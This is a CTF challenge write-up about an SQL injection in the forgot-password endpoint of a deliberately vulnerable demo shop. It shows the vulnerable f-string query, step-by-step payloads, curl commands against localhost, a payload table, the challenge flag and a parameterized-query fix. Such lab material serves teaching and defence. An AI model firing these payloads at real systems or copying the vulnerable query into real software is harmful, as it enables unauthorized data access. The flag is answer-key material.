# CTF Challenge: SQL Injection via Forgot Password

**Category:** Web / SQL Injection  
**Difficulty:** Easy–Medium  
**Flag:** `CTF{sql1_forg0t_p4ssw0rd_pwn3d}`

---

## Description

LoopyMart's "Forgot Password" feature lets users request a password-reset link
by supplying their email address.  The endpoint looks up the supplied email in
the `users` table — but the lookup is built by string-concatenating the
user-supplied value directly into raw SQL, with no parameterization and no
format validation.

---

## Vulnerability

- **Endpoint:** `POST /auth/forgot-password`
- **File:** `backend/app/api/auth.py` → `forgot_password()`
- **CWE:** CWE-89 Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)

### Root Cause

```python
# ⚠️ VULNERABLE — email interpolated into SQL without parameterization
query = f"SELECT id, email, is_active FROM users WHERE email = '{data.email}'"
result = await db.execute(text(query))
```

`ForgotPasswordRequest.email` was intentionally changed from `EmailStr` to a
plain `str`, so Pydantic no longer rejects injection payloads before they reach
the database layer.

### Injection Detection

When the returned row's `email` column differs from the supplied input, the
server knows the WHERE clause was manipulated and includes the flag in the
response JSON:

```json
{
  "message": "If the email exists, a reset link has been sent.",
  "flag": "CTF{sql1_forg0t_p4ssw0rd_pwn3d}"
}
```

---

## Exploitation

### Step-by-step

1. Send `POST /auth/forgot-password` with a classic auth-bypass payload:

   ```json
   { "email": "' OR '1'='1' --" }
   ```

   The injected query becomes:
   ```sql
   SELECT id, email, is_active FROM users WHERE email = '' OR '1'='1' --'
   ```
   `1=1` is always true, so the first row in the `users` table is returned.

2. The server detects that the matched email (`admin@...` or whoever is first)
   does not equal `' OR '1'='1' --`, and returns the flag in the response.

### Automated

```bash
python solutions/sqli-forgot-password/solve.py --url http://localhost:8001
```

### Manual (curl)

```bash
curl -s -X POST http://localhost:8001/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email": "'"'"' OR '"'"'1'"'"'='"'"'1'"'"' --"}'
# or using a simpler payload:
curl -s -X POST http://localhost:8001/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email": "x'\''OR 1=1--"}'
```

### Other useful payloads

| Payload | Effect |
|---|---|
| `' OR '1'='1' --` | Returns first user (auth bypass) |
| `' OR 1=1 --` | Same in numeric form |
| `' OR 'a'='a' --` | String comparison form |
| `nonexistent' OR id=1 --` | Target user by id |

---

## Mitigation

```python
# ✅ Secure version — always use parameterized queries
from sqlalchemy import select
result = await db.execute(select(User).where(User.email == data.email))

# Or with raw SQL and bound parameters:
from sqlalchemy import text
result = await db.execute(
    text("SELECT id, email, is_active FROM users WHERE email = :email"),
    {"email": data.email},
)
```

Additional hardening:
- Restore `EmailStr` on `ForgotPasswordRequest.email` (rejects non-email strings at validation time).
- Never build SQL strings with f-strings or `%` formatting from user input.
- Apply a rate-limit on the forgot-password endpoint to slow brute-forcing.

---

## Flag

```
CTF{sql1_forg0t_p4ssw0rd_pwn3d}
```
